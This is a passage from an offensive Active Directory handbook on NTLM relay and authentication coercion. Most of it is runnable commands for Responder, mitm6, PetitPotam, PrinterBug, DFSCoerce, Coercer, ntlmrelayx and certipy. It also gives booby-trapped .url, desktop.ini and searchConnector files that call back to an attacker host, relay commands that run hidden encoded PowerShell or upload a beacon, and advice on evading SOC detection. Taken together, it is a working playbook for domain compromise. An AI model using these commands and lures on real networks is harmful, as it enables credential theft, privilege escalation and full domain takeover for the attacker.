Those are the ones that make NTLM relay genuinely easy to spot, and they are new enough that many estates have them without having built any detection on them.
- Do not look in that channel for the authentication itself. Security log 4624 (with Authentication Package NTLM and Package Name NTLM V1 or V2) and 4776 (credential validation) are where the actual events are, and System log 6038 is the LSA warning that NTLM is in use at all.

#### Source to target viability matrix

Read "source" as the protocol the victim's authentication arrives on and "target" as the protocol you relay it to. All rows assume a target host different from the source host.

| Source | Target | Viable | Condition and notes |
| --- | --- | --- | --- |
| SMB | SMB | Yes | Target must not require SMB signing. Dead by default on Windows 11 24H2 / Server 2025 and on all DCs |
| SMB | LDAP (389) | No, in practice | SMB clients set the signing flag and the MIC protects it. Needs unpatched CVE-2019-1040 or a client that omits the MIC |
| SMB | LDAPS (636) | No, in practice | Same signing-flag problem, plus channel binding if enforced |
| SMB | HTTP | Yes | Target must not enforce EPA; over cleartext HTTP, EPA cannot apply. SMB signing on the target host is irrelevant |
| SMB | HTTPS | Only without EPA | Channel binding blocks it when `Require` or `Accept` with a CBT present |
| SMB | MSSQL | Yes | Relayed principal needs a login on the instance |
| SMB | RPC (MS-TSCH) | Yes | Depends on the RPC interface's authentication level requirements; relayed principal needs rights to create a scheduled task |
| SMB | IMAP / SMTP | Yes | Where the service accepts NTLM and the principal has a mailbox |
| HTTP | SMB | Yes | Target must not require signing. This is the classic cross-protocol reopen |
| HTTP | LDAP (389) | Yes | The workhorse. HTTP-borne NTLM does not request signing, so the DC does not enforce it unless `LDAPServerIntegrity = 2` |
| HTTP | LDAPS (636) | Yes if channel binding not enforced | Needed for operations that require an encrypted connection, such as setting passwords or adding computer accounts |
| HTTP | HTTP / HTTPS | Yes | Different host, no EPA. AD CS web enrolment is the standout |
| LDAP | anything | Rarely useful | You would need to coerce an LDAP client, which is uncommon and gains nothing |
| Any | Same host, any protocol | No | Reflection protection since MS08-068 and MS16-075 |

The single most important line in that table is HTTP to LDAP. It is why every serious coercion attempt in a modern estate tries to force **HTTP** authentication rather than SMB, and why the WebClient service is the most valuable thing you can enumerate.

#### Establishing which controls are in place before you burn the attack

Do this first, always. Coercion is noisy and you get one clean attempt before a competent SOC notices.

```bash
# Which hosts do not require SMB signing, written straight into a relay target list
nxc smb $TARGETS -u '' -p '' --gen-relay-list relay-targets.txt

# Same information unauthenticated, per host
nmap -p445 --script smb2-security-mode $TARGET

# LDAP signing and LDAP channel binding state on the DCs
nxc ldap $DC -u $USER -p $PASS -d $DOMAIN -M ldap-checker

# Standalone equivalent, checks both signing and channel binding
python3 LdapRelayScan.py -method BOTH -dc-ip $DC -u $USER -p $PASS

# Which hosts are running the WebClient service, i.e. which can be forced to speak HTTP
nxc smb $TARGETS -u $USER -p $PASS -d $DOMAIN -M webdav

# Which hosts are running the print spooler
nxc smb $TARGETS -u $USER -p $PASS -d $DOMAIN -M spooler

# Registry-level confirmation on a host you already control
reg query "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LDAPServerIntegrity
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" /v LdapEnforceChannelBinding
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" /v RestrictSendingNTLMTraffic
```

```powershell
# On a host you control, current signing posture from the SMB stack itself
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature, EncryptData
Get-SmbClientConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature, BlockNTLM
```

netexec no longer needs a module for the signing question. The `ldap` protocol now performs the signing and LDAPS channel binding checks natively on connect and prints the result in the host banner, which is why the `ldap-checker` module still exists but carries `[REMOVED]` at the front of its description. Use `nxc ldap $DC -u $USER -p $PASS` and read the banner. The `webdav` module (WebClient service state) and `spooler` module (print spooler state) are both current and both live on the `smb` protocol. `nxc <protocol> -L` lists what your build actually has, which is the only reliable check.

**Decision procedure.** If any host lacks required SMB signing, SMB relay targets exist. If LDAP signing is not required and you can obtain HTTP-borne authentication, LDAP relay is live and that is the strongest generic path. If AD CS web enrolment answers on HTTP, that is the strongest path of all and you should not bother with anything else. If all of signing, channel binding, and EPA are enforced and the WebClient service is disabled fleet-wide, this attack class is closed and you should pivot to Kerberos-based approaches.

### Getting authentication to come to you

Two philosophies: wait for it, or force it. Waiting is quiet and unreliable. Forcing is loud, instant, and lets you choose exactly which account authenticates.

#### Passive: name resolution poisoning

**What it is.** Answer broadcast and multicast name resolution queries for names that do not exist, so that a host looking for a mistyped or decommissioned server authenticates to you instead. When DNS resolution fails, Windows falls back to LLMNR (UDP 5355 multicast), NBT-NS (UDP 137 broadcast) and mDNS (UDP 5353); none of them are authenticated, whoever answers first wins, and the client then attempts SMB or HTTP to whoever answered and sends NTLM automatically because it believes the target is on the local intranet.

The full treatment, including Responder's flag set, the configuration file that decides which protocols it answers, the failure-mode table and the detection picture, is in the name-resolution poisoning material in the Active Directory: Enumeration section. What matters here is the relay-specific detail.

```bash
# Analyse mode first: listen only, no answers, no artefacts on the wire
sudo responder -I $IFACE -A
```

**The relay-specific precondition.** For HTTP-borne authentication the target name must land in the Intranet zone, which single-label names do. That is what makes a poisoned single-label name useful for the HTTP relay paths below where a bare IP address would not be, and it is the same property that makes an injected ADIDNS record so much better than a broadcast answer.

**Turn Responder's own SMB and HTTP servers off** in *Responder.conf* if you intend to relay rather than collect, so that ntlmrelayx can bind those ports instead. Responder capturing an authentication you wanted to relay is the single most common way to waste a coercion. The listener setup section below covers the port arrangement in full.

**Honest assessment.** Plain LLMNR and NBT-NS poisoning against a hardened network is mostly dead. Keep it running because it costs nothing and occasionally catches a scheduled task pointing at a decommissioned server, but do not build an engagement plan on it. Coercion, below, is what you should actually reach for, and the modern name-resolution positions are in the On-Path Attacks: The Modern Approach section.

#### IPv6 as the modern replacement: mitm6

**What it is.** Become the victims' DNS server by winning the DHCPv6 race, then answer their WPAD lookup and harvest HTTP authentication from every browser and WinHTTP client on the segment. Windows prefers IPv6 over IPv4 and enables it by default, but almost no enterprise runs IPv6 or filters DHCPv6, so a rogue DHCPv6 server can assign a link-local address and, critically, itself as the DNS server. Answering the WPAD query then yields a proxy configuration, and clients send NTLM to a proxy in the Intranet zone without prompting.

The technique itself, including the targeting flags that keep the blast radius small, the verification steps and the failure modes, is covered twice elsewhere: as part of the layer 2 toolkit in the On-Path and Traffic Attacks section, and as a position-acquisition choice in the On-Path Attacks: The Modern Approach section, which is where the preference ordering against ARP poisoning lives. What belongs here is the pairing with a relay listener, because the output of this technique is authentication rather than cleartext and the relay is what converts it.

**Preconditions.** IPv6 enabled on the clients (default) and not filtered at the switch. WPAD not disabled by policy. Requires no credentials.

```bash
# Terminal 1: become the DHCPv6 and DNS server for the domain
sudo mitm6 -d $DOMAIN -i $IFACE

# Terminal 2: serve WPAD and relay the resulting HTTP authentications to LDAPS
sudo ntlmrelayx.py -6 -wh wpad.$DOMAIN -t ldaps://$DC -smb2support --delegate-access
```

**Verify it worked.** mitm6 prints each DHCPv6 reply and every DNS query it answers. ntlmrelayx prints an inbound HTTP authentication with the victim's account name.

**Detection and opsec.** Unscoped, this is extremely disruptive: you are hijacking DNS for every host on the segment, and when you stop, clients keep the poisoned DNS server until the lease expires, which breaks name resolution. Scope it with the host allowlist flags and time-box it. Rogue DHCPv6 is detectable by any IPv6-aware monitoring and by DHCP guard on managed switches.

**Failure modes.** IPv6 disabled or RA guard and DHCPv6 guard configured yields nothing. WPAD disabled via `WpadOverride` or the DisableWpad policy yields no HTTP authentication, though you still control DNS and can poison specific names.

#### ADIDNS record injection

Any authenticated domain user can, by default, create DNS records in the AD-integrated zone because the `Create all child objects` right is granted to Authenticated Users on the zone. This gives you a legitimate, non-broadcast name that resolves to your host, which matters enormously for WebDAV coercion where you need a hostname in the Intranet zone rather than an IP.

```bash
# Add a single-label A record pointing at you
python3 dnstool.py -u "$NETBIOS\\$USER" -p "$PASS" -r evil -d $ATTACKER --action add $DC

# Confirm it resolves
nslookup evil.$DOMAIN $DC

# Remove it when finished
python3 dnstool.py -u "$NETBIOS\\$USER" -p "$PASS" -r evil --action remove $DC
```

A wildcard record (`*`) will answer queries for names that do not otherwise exist, which is a broad version of LLMNR poisoning that works across the whole forest and does not require adjacency. Note that `wpad` and `isatap` are on the DNS server's global query block list and remain unresolvable even if a record exists, unless the block list itself is modified, which requires DNS admin rights.

Always clean up records you create. A stale wildcard record in an AD zone is a serious outage.

### Coercion: the RPC families

**What it is.** Call an RPC method on the victim that takes a UNC path or file path as a parameter and causes the victim's service to access it, authenticating to you in the process.

**Why it works.** These are legitimate remote-management interfaces that accept a path and act on it. The service performing the access runs as `NT AUTHORITY\SYSTEM`, and SYSTEM authenticating over the network presents the **computer account**. None of these are memory-safety bugs and most are not considered vulnerabilities by Microsoft, which is why they persist: the interface is doing exactly what it was designed to do.

The generic form of the attack is: bind to a named pipe over SMB, call the method with `\\$ATTACKER\x` as the path argument, and catch the resulting authentication.

#### MS-RPRN: the print spooler method

The `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` methods register the caller for print change notifications and take the notification recipient as a UNC path. The spooler then connects back to that path. Known as PrinterBug or SpoolSample.

| Property | Value |
| --- | --- |
| Interface | MS-RPRN, `\pipe\spoolss`, UUID `12345678-1234-abcd-ef00-0123456789ab` |
| Privilege needed to trigger | Any authenticated domain user |
| Account that authenticates back | The victim's **computer account** |
| Patched | No. Working as designed. Mitigated only by stopping the Print Spooler service |
| Current viability | High wherever the spooler runs. Widely disabled on DCs since PrintNightmare, so check first |

```bash
# Linux, from the krbrelayx toolkit
python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER

# Force HTTP instead of SMB by giving a WebDAV-style target
python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" "$ATTACKER@80/x"

# netexec module
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M printerbug -o LISTENER=$ATTACKER
```

```powershell
# Windows
.\SpoolSample.exe $TARGET $ATTACKER
.\SharpSpoolTrigger.exe $TARGET $ATTACKER
```

**Verify it worked.** The tool prints the RPC return code. `RPC_S_SERVER_UNAVAILABLE` or a printed error about being unable to reach the notification target usually means the callback *was* attempted, which is what you want. The authoritative confirmation is your listener showing an inbound connection from the target as `$TARGET$`.

**Failure modes.** `RPC_S_ACCESS_DENIED` binding to `\pipe\spoolss` means the spooler is stopped or the pipe is restricted. `STATUS_OBJECT_NAME_NOT_FOUND` on the pipe means the spooler service is not running. Nothing arriving at the listener with a successful RPC call means outbound 445 or 80 from the target is filtered.

#### MS-EFSR: the EFS method and its variants

The Encrypting File System Remote protocol exposes a set of methods that take a file path. Passing a UNC path makes the victim's LSASS reach out to it. This is PetitPotam.

`EfsRpcOpenFileRaw` (opnum 0) was the original vector and was restricted by CVE-2021-36942 in August 2021, which blocked *unauthenticated* access to it. Everything else remains callable by any authenticated user, and there are many other methods, which is why this family has more variants than any other:

| Method | Notes |
| --- | --- |
| `EfsRpcOpenFileRaw` | The original. Blocked for anonymous callers by CVE-2021-36942, still works authenticated |
| `EfsRpcEncryptFileSrv` | Reliable authenticated variant |
| `EfsRpcDecryptFileSrv` | Reliable authenticated variant |
| `EfsRpcQueryUsersOnFile` | Reliable authenticated variant |
| `EfsRpcQueryRecoveryAgents` | Reliable authenticated variant |
| `EfsRpcRemoveUsersFromFile` | Works |
| `EfsRpcAddUsersToFile` | Works |
| `EfsRpcFileKeyInfo` | Works |
| `EfsRpcDuplicateEncryptionInfoFile` | Works |

The interface is reachable over several named pipes, and which pipes are exposed differs by target role and patch level, so trying all of them materially increases success rate: `\pipe\lsarpc`, `\pipe\efsrpc`, `\pipe\samr`, `\pipe\lsass`, `\pipe\netlogon`.

| Property | Value |
| --- | --- |
| Interface | MS-EFSR, UUIDs `c681d488-d850-11d0-8c52-00c04fd90f7e` and `df1941c5-fe89-4e79-bf10-463657acf44d` |
| Privilege needed to trigger | Any authenticated domain user (anonymous only on hosts missing the August 2021 update) |
| Account that authenticates back | The victim's **computer account** |
| Patched | Partially, anonymous access to one method only. The family is alive |
| Current viability | High. Works against DCs, which is what makes it the standard ESC8 trigger |

```bash
# Classic, SMB callback
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $TARGET

# HTTP callback via WebDAV, which is what you want for LDAP or AD CS relay
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS "$ATTACKER@80/x" $TARGET

# netexec
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M petitpotam -o LISTENER=$ATTACKER
```

```powershell
.\PetitPotam.exe $ATTACKER $TARGET
.\SharpEfsTrigger.exe $TARGET $ATTACKER
```

**Verify it worked.** `ERROR_BAD_NETPATH` returned from the RPC call is the success indicator: the victim tried to reach your UNC path and failed to find the share, which means it authenticated first. Seeing that error and nothing at your listener means the callback was blocked in transit.

**Failure modes.** `rpc_s_access_denied` on `\pipe\lsarpc` as an anonymous caller means the host has the August 2021 update; supply credentials. `ERROR_FILE_NOT_FOUND` usually means the path argument was malformed. Access denied on every pipe means the RPC interface is filtered, which is what RPC Firewall deployments do.

#### MS-DFSNM: DFS namespace method

`NetrDfsRemoveStdRoot` and `NetrDfsAddStdRoot` take a server name and share name for a DFS namespace root. Known as DFSCoerce.

| Property | Value |
| --- | --- |
| Interface | MS-DFSNM, `\pipe\netdfs`, UUID `4fc742e0-4a10-11cf-8273-00aa004ae673` |
| Privilege needed to trigger | Any authenticated domain user on unhardened builds |
| Account that authenticates back | The victim's **computer account** |
| Patched | **No. Never.** There is no CVE, no KB and no MSRC advisory for DFSCoerce. MS-DFSNM says only that servers *should* perform method-specific access checks, and the product-behaviour notes for opnums 12 and 13 say nothing about an administrator restriction. Mitigation is an RPC filter on the interface UUID, blocking `\pipe\netdfs`, or stopping the `Dfs` service |
| Current viability | Good against DCs, which run the DFS Namespace service by default. Test both methods |

```bash
python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $TARGET
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M dfscoerce -o LISTENER=$ATTACKER
```

The value of DFSCoerce is that it survives environments where the print spooler has been disabled and MS-EFSR has been filtered, because the DFS Namespace service is required for DFS to function and is therefore rarely stopped on DCs.

#### MS-FSRVP: the shadow copy method

`IsPathSupported` and `IsPathShadowCopied` take a UNC path. Known as ShadowCoerce.

| Property | Value |
| --- | --- |
| Interface | MS-FSRVP, `\pipe\FssagentRpc`, UUID `a8e0653c-2744-4389-a61d-7373df8b2292`, interface `FileServerVssAgent`. Trigger opnums are 8 (`IsPathSupported`) and 9 (`IsPathShadowCopied`) |
| Privilege needed to trigger | Any authenticated domain user |
| Account that authenticates back | The victim's **computer account** |
| Patched | **Yes, 14 June 2022, CVE-2022-30154.** Per-OS KBs: Server 2022 KB5014678, 2019 KB5014692, 2016 KB5014702, 2012 R2 KB5014746, 2012 KB5014747. The change enforced the caller check that MS-FSRVP had always documented as intended behaviour, membership of the local Administrators or Backup Operators group. Note the CVE is titled as an elevation of privilege in the RVSS agent and does not name ShadowCoerce; the link is established by the regression KB (KB5015527), which attributes an access-denied side effect to privilege requirement checks added to the `FssAgentRpc` service by that CVE |
| Current viability | Low. Requires the File Server VSS Agent Service, which is not installed by default. Worth trying on file servers |

```bash
python3 shadowcoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $TARGET
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M shadowcoerce -o LISTENER=$ATTACKER
```

#### MS-EVEN: the event log method

`ElfrOpenBELW` opens a backup event log at a given path, and that path can be a UNC path.

| Property | Value |
| --- | --- |
| Interface | MS-EVEN, `\pipe\eventlog`, UUID `82273fdc-e32a-18c3-3f78-827929dc23ea`, interface `eventlog` version 0.0. `ElfrOpenBELW` is opnum 9 and its ANSI twin `ElfrOpenBELA` is opnum 16, which is an equally usable vector |
| Privilege needed to trigger | Any authenticated domain user |
| Account that authenticates back | The victim's **computer account** |
| Patched | No |
| Current viability | Useful as a fallback. The legacy event log RPC interface is present on all Windows versions |

Available through Coercer's protocol set and netexec's coercion module rather than as a standalone script.

#### Automated multi-method coercion

Trying every method and every pipe by hand is a waste of time. Two tools do the enumeration.

```bash
# Scan mode: which coercion methods and pipes respond on this host, without coercing
Coercer scan -t $TARGET -u $USER -p $PASS -d $DOMAIN --dc-ip $DC

# Coerce mode: fire every known method at the target with your listener
Coercer coerce -l $ATTACKER -t $TARGET -u $USER -p $PASS -d $DOMAIN --dc-ip $DC --always-continue

# Restrict to a single protocol family once you know what works
Coercer coerce -l $ATTACKER -t $TARGET -u $USER -p $PASS -d $DOMAIN --filter-protocol-name "MS-EFSR"

# Fuzz mode walks the parameter space looking for undocumented working paths
Coercer fuzz -t $TARGET -u $USER -p $PASS -d $DOMAIN
```

```bash
# netexec's consolidated coercion module, all methods in one pass
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M coerce_plus -o LISTENER=$ATTACKER METHOD=all
```

There is no separate WebDAV flag in Coercer. `coerce` mode builds both SMB-style and HTTP-style paths for every method it tries, the HTTP ones taking the form `\\<listener>@<port>\...`, and `--http-port` (default 80) sets the port that appears in them. The listener is `-l`/`--listener-ip`, the target is `-t`/`--target-ip` or `-f`/`--targets-file`, and `--filter-protocol-name` and `--filter-method-name` narrow the attempt set, which is how you go from a `scan` result to a single surgical call. `scan` and `fuzz` modes additionally accept `--path-ip` as an alternative to `--listener-ip`, and `--min-http-port`/`--max-http-port` to sweep a range.

netexec's `coerce_plus` module takes `LISTENER` (alias `L`) and `METHOD` (alias `M`), with `METHOD` accepting `Petitpotam`, `DFSCoerce`, `ShadowCoerce`, `Printerbug`, `MSEven` or `All`, matched on the first letter, plus `ALWAYS` to keep going through every method rather than stopping at the first that works. Omitting `LISTENER` turns it into a pure vulnerability check with no coercion.

**Opsec note on multi-method tools.** Firing every method at every pipe generates dozens of failed RPC binds and a large burst of Event 5145 records naming exactly the pipes that coercion tools use. This is one of the loudest things in this entire document. Use `scan` mode to identify the one method that works, then use that one method alone.

### Forcing HTTP instead of SMB: WebDAV and the WebClient service

This is the most important subsection here. Everything about the viability matrix comes down to whether you can get HTTP-borne authentication instead of SMB-borne authentication.

**What it is.** Windows' WebDAV redirector (the WebClient service) makes remote WebDAV shares appear as UNC paths. If a UNC path cannot be resolved over SMB, or is written in a form that specifies a port, the WebClient service takes over and performs the access over HTTP, authenticating with NTLM over HTTP.

**Why it matters.** HTTP-borne NTLM does not carry the SMB client's signing request. That single fact reopens every target that SMB signing protects:

- LDAP relay becomes possible, because the DC no longer sees a client demanding signing.
- LDAPS relay becomes possible where channel binding is not enforced.
- AD CS web enrolment becomes reachable, which is the strongest single relay target in AD.
- The target host's SMB signing configuration becomes irrelevant, because you are not relaying to SMB.

**Why it works mechanically.** The WebClient service runs in the context of the caller. When a SYSTEM-context service such as the print spooler or LSASS resolves the UNC path, the resulting HTTP authentication is performed as the machine account. So spooler coercion with a WebDAV target yields **the victim computer account authenticating over HTTP**, which is exactly the combination that unlocks LDAP and AD CS.

**Preconditions.**

- The WebClient service must be running on the victim. It is installed by default on client editions of Windows as part of the WebDAV Redirector feature, set to manual start, and is *not* installed by default on Server editions.
- The UNC hostname must land in the Intranet zone. An IP address is treated as Internet zone and Windows will not send credentials automatically. Use a single-label name: a NetBIOS name you poison with Responder, or an ADIDNS record you created, or the target's own trusted name.
- The UNC path must be in a form that engages the WebDAV redirector, conventionally `\\HOST@PORT\path`, which in URL form is `http://HOST:PORT/path`.

**Enumerating it.** WebClient's presence is detectable by the existence of the `DAV RPC SERVICE` named pipe on the target.

```bash
# Sweep for hosts running WebClient
nxc smb $TARGETS -u $USER -p $PASS -d $DOMAIN -M webdav

# Standalone scanner
python3 webclientservicescanner.py "$DOMAIN/$USER:$PASS@$TARGETS"
```

**Starting it when it is not running.** The service is manual-start and triggered on demand. You cannot start it remotely without administrative rights, but you can make a user's own session start it. Both of the following start WebClient when the containing folder is displayed in Explorer:

A `.searchConnector-ms` file, which Explorer parses on directory listing and which registers a search location over WebDAV:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>imageres.dll,-1002</iconReference>
  <description>Documents</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <templateInfo>
    <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>http://$ATTACKER/</url>
  </simpleLocation>
</searchConnectorDescription>
```

A `.library-ms` file achieves the same via a library definition pointing at a WebDAV URL.

On a host where you already have code execution, starting it directly is trivial:

```cmd
sc.exe start WebClient
net use x: http://$ATTACKER/x
```

```powershell
Start-Service WebClient
```

**Triggering coercion over HTTP.** Every RPC coercion method above accepts a WebDAV-style target. The listener argument changes from `$ATTACKER` to `$ATTACKER@80/x`, and the port must match wherever your HTTP relay server is listening.

```bash
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS "evil@80/x" $TARGET
python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" "evil@80/x"
```

Here `evil` is the single-label ADIDNS record you created pointing at `$ATTACKER`. Using the raw IP will fail silently because the Internet zone suppresses automatic NTLM.

**Failure modes.** Coercion succeeds at the RPC layer but nothing arrives on HTTP: WebClient is not running on the victim. Something arrives but with no `Authorization: NTLM` header: the hostname resolved to the Internet zone, so use a single-label name. WebClient running and name correct but still nothing: the target's outbound HTTP is filtered, or the port in the UNC path does not match your listener.

### File-based coercion

**What it is.** Drop files on a writable share whose metadata references a UNC path. When a user's Explorer window lists the directory, it resolves the icon or thumbnail and authenticates to you. No RPC call, no direct interaction with the victim, and it fires whenever someone happens to browse the folder.

**Why it works.** Explorer eagerly resolves icon references, shortcut targets, thumbnails, and folder customisations at listing time, before the user clicks anything. The resolution is a normal SMB or WebDAV access from the user's session.

**The critical distinction.** File-based coercion yields the **user** account of whoever browses the share, not a machine account. That makes it a different tool: excellent for harvesting user hashes and for landing an authentication from a privileged human (a Domain Admin browsing an IT share), useless for the machine-account chains.

**Preconditions.** Write access to a share that people actually browse. A share nobody visits produces nothing.

Working file types:

| File | Mechanism | Notes |
| --- | --- | --- |
| `.url` | `IconFile` pointing at a UNC path | Fires on directory listing. Very reliable |
| `.lnk` | Icon location pointing at a UNC path | Fires on directory listing |
| `desktop.ini` | `IconResource` pointing at a UNC path | Applies to the containing folder |
| `.library-ms` | Library location pointing at a UNC or WebDAV URL | Also starts WebClient |
| `.searchConnector-ms` | Search location pointing at a WebDAV URL | Also starts WebClient |
| Office documents | Remote template, external image, or external data reference | Requires the document to be opened, not merely listed |
| `.scf` | `IconFile` in a shell command file | Dead. Neutered by a Windows patch in 2017 |

```ini
; evil.url
[InternetShortcut]
URL=http://example.local
WorkingDirectory=x
IconFile=\\$ATTACKER\share\icon.ico
IconIndex=1
```

```ini
; desktop.ini
[.ShellClassInfo]
IconResource=\\$ATTACKER\share\icon.ico
```

```bash
# Generate the full set of file types at once
python3 ntlm_theft.py -g all -s $ATTACKER -f payroll

# Drop them onto a writable share
smbclient.py "$DOMAIN/$USER:$PASS@$TARGET"
# use Finance
# put payroll.url
```

**Verify it worked.** Responder or your relay listener shows an inbound authentication from a *user* account, with the source IP being the workstation of whoever browsed the folder.

**Detection and opsec.** The files persist until you remove them, and they are trivially found by anyone looking for UNC references in share content. Name them plausibly, put them where they fit, and delete them at the end of the engagement. A file called `evil.url` in the root of the finance share is an instant finding for the blue team.

**Failure modes.** The share is read-only. Nobody browses the folder. Explorer thumbnail and icon caching means a user who has already listed the folder may not re-resolve immediately. Client firewalls blocking outbound 445 to your host.

### Which account authenticates back, and why machine accounts matter

This is the distinction that determines which chain you can run, and getting it wrong wastes the whole attempt.

| Coercion method | Authenticating principal |
| --- | --- |
| MS-RPRN, MS-EFSR, MS-DFSNM, MS-FSRVP, MS-EVEN | The victim's computer account |
| Any of the above with a WebDAV target | The victim's computer account, over HTTP |
| File-based coercion on a share | The user who browses the share |
| LLMNR, NBT-NS, mDNS poisoning | Usually the user, whichever session made the lookup |
| mitm6 with WPAD | The user for browser traffic, the computer account for SYSTEM-context HTTP clients |
| Scheduled task or service pointing at a dead path | Whatever account it runs as, often SYSTEM, so the computer account |

**Why a coerced computer account is so valuable.** Machine accounts look unprivileged and are not. Specifically:

- A **domain controller's** computer account holds replication rights: the `Domain Controllers` group is granted `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` on the domain object. Relay a DC computer account to LDAP on a *different* DC and you can read secrets or grant yourself rights. Obtain a certificate as a DC computer account and you can PKINIT to a TGT for that DC and then dump the whole directory. This is why the DC-to-AD-CS chain ends the engagement.
- Any computer account can enrol for machine certificates, so a coerced machine account plus an AD CS enrolment endpoint means a certificate, means a TGT, means the machine's NT hash via `U2U`/PKINIT credential extraction.
- Computer accounts are local `SYSTEM` on their own host, so a computer account relayed to LDAP can write its own `msDS-KeyCredentialLink` or be granted delegation rights, turning directory write access into local code execution.
- Machine account passwords are 120 random characters rotated every 30 days, so capture-and-crack is not an option and relay is the *only* way to use them.
- Conversely, relaying a *non-DC* computer account to SMB on a *different* host almost always yields nothing, because machine accounts are not local administrators anywhere except their own machine, and same-host relay is blocked. If your plan is "coerce WORKSTATION01 and relay to SMB on FILE01" then stop: it will authenticate successfully and then be denied. Machine accounts go to LDAP or to AD CS, not to SMB.

### Relay targets and what each yields

#### SMB

| Item | Detail |
| --- | --- |
| Precondition | Target does not require SMB signing. Relayed principal is a local administrator on the target for anything beyond share enumeration |
| Yields | Local SAM and LSA secrets dump, command execution via service creation, file read and write, share enumeration |
| Currency | Declining fast. Dead by default against Windows 11 24H2, Server 2025, and every DC |

```bash
# Default behaviour with an SMB target is to dump the SAM
ntlmrelayx.py -tf relay-targets.txt -smb2support

# Execute a command on success
ntlmrelayx.py -tf relay-targets.txt -smb2support -c 'powershell -w hidden -enc <BASE64>'

# Upload and execute a binary
ntlmrelayx.py -tf relay-targets.txt -smb2support -e /path/to/beacon.exe

# Interactive SMB client bound to a local port per relayed session
ntlmrelayx.py -tf relay-targets.txt -smb2support -i
```

With `-i`, ntlmrelayx prints a local port (starting at 11000) per established session; connect with `nc 127.0.0.1 11000` for a minimal SMB shell against that session.

#### LDAP and LDAPS

The most productive target in a modern estate, and the one that HTTP coercion exists to reach.

| Item | Detail |
| --- | --- |
| Precondition, LDAP 389 | `LDAPServerIntegrity` not set to require, *and* the incoming authentication did not request signing, which in practice means HTTP-borne |
| Precondition, LDAPS 636 | Channel binding not enforced. Required for operations needing a confidential connection, such as setting passwords or creating computer accounts |
| Yields | Arbitrary directory writes within the relayed principal's rights |

The concrete outcomes, in descending order of value:

| Outcome | ntlmrelayx flag | Requirement on the relayed principal |
| --- | --- | --- |
| Grant DCSync rights by writing an ACE on the domain object | `--escalate-user $USER` | Write rights on the domain object, which a DC computer account has |
| Configure resource-based constrained delegation on the relayed computer | `--delegate-access` | The relayed principal must be able to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on its own object, which a computer account can |
| Create a computer account to use as the delegation principal | `--add-computer` | `MachineAccountQuota` above zero, LDAPS |
| Write shadow credentials onto a target object | `--shadow-credentials --shadow-target 'TARGET$'` | Write rights on the target's `msDS-KeyCredentialLink`; functional AD CS not required, only a KDC supporting PKINIT |
| Read LAPS passwords | `--dump-laps` | Read rights on the LAPS attribute |
| Read gMSA passwords | `--dump-gmsa` | Read rights on `msDS-ManagedPassword` |
| Enumerate AD CS configuration | `--dump-adcs` | Any read access |

```bash
# LDAPS, configure RBCD, creating the delegation computer account automatically
ntlmrelayx.py -t ldaps://$DC -smb2support --delegate-access

# LDAPS, delegate to an account you already control
ntlmrelayx.py -t ldaps://$DC -smb2support --delegate-access --escalate-user 'FAKE01$'

# LDAP, grant DCSync to a user you control, when relaying a DC computer account
ntlmrelayx.py -t ldap://$DC -smb2support --escalate-user $USER

# Shadow credentials on a specific target
ntlmrelayx.py -t ldaps://$DC -smb2support --shadow-credentials --shadow-target 'TARGET$'

# Read-only reconnaissance through the relayed session
ntlmrelayx.py -t ldaps://$DC -smb2support --dump-laps --dump-gmsa --dump-adcs --no-dump
```

Point the relay at a DC that is *not* the host you coerced. Relaying a DC's own authentication back to itself hits reflection protection.

#### HTTP and HTTPS

| Endpoint | Precondition | Yields |
| --- | --- | --- |
| AD CS web enrolment, `/certsrv/certfnsh.asp` | Web Enrollment role installed, HTTP available or HTTPS without EPA | A certificate as the relayed principal. This is ESC8 |
| AD CS Certificate Enrollment Web Service | CES installed, no EPA | Same as above through the WS endpoint |
| AD CS RPC enrolment interface (MS-ICPR) | `IF_ENFORCEENCRYPTICERTREQUEST` disabled on the CA | A certificate over RPC rather than HTTP. This is ESC11 |
| Exchange EWS and ECP | EPA not enabled, which means unpatched Exchange | Mailbox access, and historically directory writes via PrivExchange |
| SCCM management point and admin service | Windows authentication, no EPA | Site database access, client push credentials, application deployment to clients |
| Any internal app with Windows authentication | HTTP or HTTPS without EPA | Whatever the app does with an authenticated identity |

```bash
# ESC8 through impacket
ntlmrelayx.py -t "http://$CAHOST/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController

# ESC8 through certipy, which handles the CSR and PFX assembly
certipy relay -target "http://$CAHOST" -template DomainController

# ESC11, relay to the CA's RPC enrolment interface
certipy relay -target "rpc://$CAHOST" -ca 'CORP-CA'
```

